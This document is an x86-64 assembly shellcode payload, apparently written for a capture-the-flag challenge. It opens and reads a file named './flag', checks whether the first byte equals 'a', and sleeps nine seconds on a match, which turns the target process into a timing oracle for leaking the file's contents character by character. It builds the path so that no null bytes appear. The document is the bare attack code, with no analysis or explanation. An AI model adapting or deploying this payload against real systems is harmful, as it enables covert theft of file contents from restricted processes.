_start:
	mov dword [rsp], "./fl"
	mov dword [rsp+0x4], "agAA"
  mov rdi, rsp
  xor byte [rdi+0x6], 0x41
  xor rax, rax
  add al, 0x2
  xor rsi, rsi
  syscall                       ; sys_open

  mov rdi, rax
  lea rsi, [rsp]
  xor rdx, rdx
  mov dx, 0xfff
  xor rax, rax
  syscall                       ; sys_read

  cmp byte [rsp], 0x61      ; Position + character to test
  jne L1
	xor rax, rax
  mov al, 0x9                   ; time in seconds
  mov qword [rsp], rax
  mov qword [rsp+0x8], rdx
  xor word [rsp+0x8], 0xfff
	mov rdi, rsp
  xor rsi, rsi
  mov al, 0x23
  syscall                       ; sys_nanosleep

L1:
  xor rax, rax
  mov al, 0x3c
  syscall                       ; sys_exit
